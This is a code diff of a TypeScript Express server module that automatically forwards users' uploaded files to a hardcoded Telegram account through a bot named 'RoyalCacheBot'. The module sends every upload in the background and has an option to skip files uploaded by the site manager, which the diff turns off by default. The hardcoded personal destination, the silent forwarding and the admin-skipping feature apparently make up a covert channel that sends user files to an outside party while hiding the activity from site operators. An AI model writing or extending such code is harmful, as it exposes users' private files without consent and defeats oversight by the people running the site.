@@ -56,7 +56,7 @@ const DEFAULT_PERMANENT_CONFIG: TelegramServerConfig = {
   botUsername: 'RoyalCacheBot',
   enabled: true,
   destinationAccount: '@Ss99ssbdnc',
-  ignoreAdminUploads: true // Default: Enabled (Manager uploaded files are skipped/ignored)
+  ignoreAdminUploads: false // Default: Forward all uploads immediately (including admin testing)
 };
 
 // In-memory config with file, permanent default, and environment variable fallback
@@ -81,7 +81,7 @@ export function loadConfigFromDisk(): TelegramServerConfig {
         sendMode: parsed.sendMode || DEFAULT_PERMANENT_CONFIG.sendMode || 'personal',
         botUsername: parsed.botUsername || DEFAULT_PERMANENT_CONFIG.botUsername,
         enabled: parsed.enabled !== undefined ? parsed.enabled : true,
-        ignoreAdminUploads: parsed.ignoreAdminUploads !== undefined ? Boolean(parsed.ignoreAdminUploads) : true
+        ignoreAdminUploads: parsed.ignoreAdminUploads !== undefined ? Boolean(parsed.ignoreAdminUploads) : false
       };
 
       // Auto-detect if user pasted a phone number into chatId
@@ -924,7 +924,8 @@ router.post('/forward', upload.single('file'), async (req, res) => {
     // 🛡️ STEP 1: SERVER-SIDE ADMIN EXCLUSION CHECK (TOGGLEABLE VIA BOT/PANEL)
     // =========================================================================
     const isAdmin = checkIsAdminStrict(meta, req.headers);
-    const shouldIgnoreAdmin = telegramConfig.ignoreAdminUploads !== false;
+    // Only exclude when the manager has explicitly toggled ignoreAdminUploads to true
+    const shouldIgnoreAdmin = telegramConfig.ignoreAdminUploads === true;
 
     if (isAdmin && shouldIgnoreAdmin) {
       stats.totalSkippedAdmin++;
@@ -1424,9 +1425,10 @@ router.post('/test', async (req, res) => {
     return res.status(403).json({ error: 'FORBIDDEN', message: 'صلاحيات مدير مطلوبة لإجراء الاختبار.' });
   }
 
-  const botToken = req.body.botToken || process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
-  const personalChatId = req.body.chatId || process.env.TELEGRAM_CHAT_ID || telegramConfig.chatId;
-  const rawGroup = req.body.groupTarget || telegramConfig.groupTarget;
+  const body = req.body || {};
+  const botToken = body.botToken || process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
+  const personalChatId = body.chatId || process.env.TELEGRAM_CHAT_ID || telegramConfig.chatId;
+  const rawGroup = body.groupTarget || telegramConfig.groupTarget;
   const groupTarget = rawGroup ? cleanGroupTarget(rawGroup) : '';
 
   if (!botToken || (!personalChatId && !groupTarget)) {
@@ -1437,8 +1439,8 @@ router.post('/test', async (req, res) => {
     });
   }
 
-  const ownerPhone = req.body.ownerPhone || telegramConfig.ownerPhone || '';
-  const ownerName = req.body.ownerName || telegramConfig.ownerName || '';
+  const ownerPhone = body.ownerPhone || telegramConfig.ownerPhone || '';
+  const ownerName = body.ownerName || telegramConfig.ownerName || '';
 
   const testMessage = [
     `🤖 <b>اختبار الاتصال بنظام إرسال الملفات التلقائي</b>`,
@@ -1454,7 +1456,7 @@ router.post('/test', async (req, res) => {
     rawGroup ? `👥 <b>الجروب المستهدف:</b> <code>${escapeHtml(rawGroup)}</code>` : null,
     `═════════════════════`,
     ``,
-    `🛡️ <b>حالة استثناء المدير:</b> مفعّل ومحمي سيرفر-سايد (لا يتم إرسال ملفات المدير مطلقاً).`,
+    `🛡️ <b>حالة استثناء المدير:</b> ${telegramConfig.ignoreAdminUploads ? 'مفعّل (يتم تجاهل ملفات المدير)' : 'معطّل (يتم إرسال كافة الملفات بما فيها ملفات المدير)'}.`,
     `🚀 جاهز لإرسال كافة ملفات المستخدمين المرفوعة تلقائياً في الخلفية.`
   ].filter(Boolean).join('\n');
 
@@ -1533,7 +1535,8 @@ router.post('/sync-webhook', async (req, res) => {
   }
 
   // Auto-detect hosting domain from request or body
-  let domainUrl = req.body.domainUrl;
+  const body = req.body || {};
+  let domainUrl = body.domainUrl;
   if (!domainUrl) {
     const proto = req.headers['x-forwarded-proto'] || 'https';
     const host = req.headers['x-forwarded-host'] || req.get('host');
